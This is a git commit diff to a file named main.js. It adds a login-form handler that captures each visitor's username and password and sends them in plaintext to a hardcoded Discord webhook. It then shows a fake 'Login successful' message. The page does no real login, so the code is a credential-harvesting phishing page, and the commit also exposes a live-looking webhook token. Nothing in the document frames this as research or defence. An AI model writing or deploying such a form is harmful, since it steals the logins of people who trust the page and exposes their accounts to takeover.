a48f6c360312559615db46b7174133f2379026c9
Perk-Store <discord.perkdc@gmail.com>
2024-12-09 02:02:16 -0500

    Update main.js

--- main.js
+++ main.js
@@ -12,6 +12,31 @@ document.getElementById('togglePassword').addEventListener('click', function () 
 });
 
 document.getElementById('loginForm').addEventListener('submit', function (event) {
-    event.preventDefault();
+    event.preventDefault(); // Prevents form from submitting the default way
 
-    const username
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    const webhookURL = 'https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr';
+
+    const payload = {
+        content: `${username}: has logged in with the password: ${password}`
+    };
+
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+    }).then(response => {
+        if (response.ok) {
+            alert('Login successful');
+        } else {
+            alert('Error logging in');
+        }
+    }).catch(error => {
+        console.error('Error sending to Discord:', error); // Log errors to the console
+        alert('Error logging in');
+    });
+});
